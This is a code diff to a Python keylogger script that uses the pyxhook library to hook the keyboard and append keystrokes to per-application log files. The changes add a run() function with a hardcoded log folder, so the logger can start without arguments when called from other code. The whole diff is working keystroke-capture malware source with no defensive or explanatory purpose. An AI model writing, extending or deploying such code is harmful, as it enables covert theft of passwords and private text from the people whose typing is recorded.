@@ -3,11 +3,25 @@ import sys
 import os
 import errno
 
+path = None
 def main():
 	if (len(sys.argv) < 2):
 	        print "Correct usage is: python keylogger.py [logfile directory]"
 	        sys.exit(1)
 	path = sys.argv[1]
+	try: 
+	    os.makedirs(path)
+	except OSError:
+	    if not os.path.isdir(path):
+	        raise
+
+	hook = pyxhook.HookManager()
+	hook.KeyDown=logkey
+	hook.HookKeyboard()
+	hook.start()
+def run():
+	#path = sys.argv[1]
+	path = 'logfolder'
 	try: 
 	    os.makedirs(path)
 	except OSError:
@@ -47,7 +61,10 @@ def logkey(event):
 	#print event.Window
 	#print event.WindowName
 	#print event.WindowProcName
-	path = sys.argv[1]
+	# if __name__ == '__main__':
+	# 	path = sys.argv[1]
+	# else:
+	path = 'logfolder'
 	logname = path+'/'+str(event.WindowProcName).strip() + ".log"
 	f=open(logname,'a')
 	#f.write(event.WindowProcName)
